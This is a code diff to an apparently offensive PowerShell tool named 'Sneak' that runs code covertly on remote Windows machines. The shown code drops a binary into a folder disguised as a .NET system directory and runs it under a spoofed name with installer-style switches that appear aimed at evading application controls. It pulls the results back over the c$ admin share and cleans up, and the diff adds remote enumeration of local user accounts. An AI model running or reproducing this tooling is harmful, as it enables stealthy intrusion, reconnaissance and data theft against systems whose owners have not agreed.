@@ -22,12 +22,14 @@ options
 -Outfilename       The name of the file you want to output to(not path) used with Out switch if required output
 -Out               Outputs results to local host
 -ViewSessions      Views all sessions you are connected to
--RemoveSession     Removes a session you are connected to" -ForegroundColor Yellow
+-RemoveSession     Removes a session you are connected to
+-Userlist          Lists all local users on the Remotemachine box(Used with RemoteMachine)
+-Capability        Checks to see if you have the ability to run operations using this box" -ForegroundColor Yellow
 
 $sessions=(Get-PSSession).Id
 $count=$sessions.count
 Write-Host "You have $count Sessions open" -ForegroundColor Green
-
+$bool=Test-Path C:\Users\$env:username\Desktop\sneakitems
 function Sneak{
 [CmdletBinding(DefaultParameterSetName="Local")]
 
@@ -38,6 +40,7 @@ param(
 [parameter(ParameterSetname="Remote")]
 [parameter(ParameterSetname="Test")]
 [parameter(ParameterSetname="Remove")]
+[parameter(ParameterSetname="Users")]
 [validatenotnull()]
 [string]$remotemachine,
 [parameter(ParameterSetname="Test")]
@@ -64,7 +67,11 @@ param(
 [parameter(ParameterSetname="Remove")]
 [switch]$RemoveSession,
 [parameter(ParameterSetname="View")]
-[switch]$ViewSessions
+[switch]$ViewSessions,
+[parameter(ParameterSetname="Users")]
+[switch]$UserList,
+[parameter(ParameterSetname="Capabilities")]
+[switch]$Capability
 )
 $realpath="C:\Windows\Microsoft.NET\Framework64\v2.0.50727\"
 $pathcheck1=Test-Path "$realpath\csc.exe"
@@ -75,16 +82,23 @@ $count=$sessions.count
 Get-PSSession
 Write-Host "You have $count Sessions open" -ForegroundColor Green
 }
-if($RemoveSession){
-Remove-PSSession -ComputerName $remotemachine
-}
+if($Capability){
 if($pathcheck1 -and $pathcheck2){
 Write-Host "You have the files necessary to go on" -ForegroundColor Green
 }#End If
 else{
 Write-Host "Sorry you don't have the necessary files to do this operarion" -ForegroundColor Red
 break;
+}}
+if($UserList){
+$names=(Get-WmiObject -ComputerName $remotemachine -Class Win32_UserAccount -Filter "LocalAccount=True" | select name).name
+Write-Host "This is your list of Local Users on this box:" -ForegroundColor Green
+Write-Host $names -Separator "`n"
 }
+if($RemoveSession){
+Remove-PSSession -ComputerName $remotemachine
+}
+
 $hiddenpath="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32"
 $hiddenpath2="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\"
 $normpath="C:\users\$env:username\Desktop"
@@ -187,7 +201,8 @@ invoke-command -Session $session{ [System.IO.File]::WriteAllBytes("C:\users\$env
 invoke-command -Session $session{ cd C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\}
 $command2="cmd.exe /C $spoofname /logfile=C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\log.txt /LogToConsole=false /U `"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
-New-Item -Path C:\Users\$env:username\Desktop\sneakitems -ItemType directory
+if(!$bool){
+New-Item -Path C:\Users\$env:username\Desktop\sneakitems -ItemType directory}
 $creduser=($Creds).username
 Copy-Item -Path \\$Remotemachine\c$\users\$creduser\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Outfilename -Destination C:\Users\$env:username\Desktop\sneakitems
 write-host "Cleaning up[+]" -ForegroundColor Green
